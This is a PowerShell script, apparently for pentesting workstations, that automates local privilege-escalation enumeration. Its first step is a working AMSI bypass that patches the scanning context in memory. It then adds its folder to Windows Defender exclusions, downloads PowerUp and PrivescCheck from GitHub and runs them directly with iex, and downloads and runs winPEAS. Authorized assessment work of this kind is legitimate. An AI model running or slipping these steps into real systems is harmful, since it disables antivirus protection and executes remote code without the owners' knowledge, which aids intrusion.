Start-Transcript -path ".\Invoke-WorkstationAssessment_unprivileged.log" -append

Write-Host '#########################' -BackgroundColor Black
Write-Host '## Bypassing AMSI      ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

#### Add Exclusion (Defender)
Write-Host '####################################################' -BackgroundColor Black
Write-Host '## Add current folder to defender exclusions      ##' -BackgroundColor Black
Write-Host '####################################################' -BackgroundColor Black
Write-Host 'Adding the current folder to the defender exclusion list' -ForegroundColor Black -BackgroundColor White
$currentPath=(Get-Location).Path
Add-MpPreference -ExclusionPath $currentPath

Write-Host '#########################' -BackgroundColor Black
Write-Host '## Running PowerUp      ##' -BackgroundColor Black
Write-Host '#########################' -BackgroundColor Black
Write-Host 'Running PowerUp and saving HTML output' -ForegroundColor Black -BackgroundColor White
mkdir PowerUp
cd PowerUp
iex(New-Object Net.WebClient).DownloadString("https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1")
Invoke-PrivescAudit -ErrorAction SilentlyContinue -HTMLReport
cd ..

Write-Host '######################################' -BackgroundColor Black
Write-Host '## Running Invoke-PrivescCheck      ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Running Invoke-PrivescCheck and saving HTML output' -ForegroundColor Black -BackgroundColor White
mkdir Invoke-PrivEscCheck
cd Invoke-PrivEscCheck
iex(New-Object Net.WebClient).DownloadString("https://github.com/itm4n/PrivescCheck/raw/master/PrivescCheck.ps1")
Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,XML -Extended
cd ..

Write-Host '######################################' -BackgroundColor Black
Write-Host '## Running WinPeas                  ##' -BackgroundColor Black
Write-Host '######################################' -BackgroundColor Black
Write-Host 'Running WinPeas and saving output' -ForegroundColor Black -BackgroundColor White
# Get latest release
$currentPath=(Get-Location).Path
mkdir WinPEAS
cd WinPEAS
$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
wget $url -OutFile $currentPath/winPEASx64.exe
./winPEASx64.exe log
cd ..
Stop-Transcript
